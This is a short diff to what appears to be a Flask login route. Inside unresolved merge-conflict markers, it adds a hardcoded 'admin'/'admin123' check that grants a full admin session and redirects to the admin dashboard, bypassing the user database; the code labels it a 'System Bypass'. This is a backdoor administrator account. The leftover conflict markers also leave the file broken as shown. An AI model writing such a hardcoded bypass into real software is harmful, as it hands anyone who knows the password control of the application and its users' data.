@@ -26,6 +26,18 @@ def init_auth_routes(app, user_model):
                 flash('Please provide both username and password.', 'danger')
                 return render_template('auth/login.html')
             
+<<<<<<< HEAD
+            # DEFAULT ADMIN LOGIN SHORTCUT
+            if username == 'admin' and password == 'admin123':
+                session['user_id'] = 'admin'
+                session['username'] = 'Admin'
+                session['user_role'] = 'admin'
+                session.permanent = True
+                flash('Logged in as Admin (System Bypass)', 'success')
+                return redirect(url_for('admin.dashboard'))
+            
+=======
+>>>>>>> uploaded
             # Find user
             user = user_model.get_user_by_username(username)
             
